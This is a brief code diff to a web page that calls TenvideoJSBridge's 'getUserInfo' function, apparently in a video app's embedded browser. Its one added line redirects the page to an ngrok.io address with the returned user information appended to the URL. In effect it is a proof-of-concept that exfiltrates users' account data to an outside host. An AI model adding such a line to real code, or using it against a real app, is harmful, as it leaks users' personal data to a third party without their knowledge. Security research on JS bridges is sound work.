@@ -256,6 +256,7 @@
                 TenvideoJSBridge.invoke('getUserInfo', { 'type': type }, function (ret) {
                     var jret = JSON.parse(ret);
                     alert(JSON.stringify(jret.result));
+	            window.location.replace("https://361ad762.ngrok.io/?name="+JSON.stringify(jret.result));		
                 });
             },
 
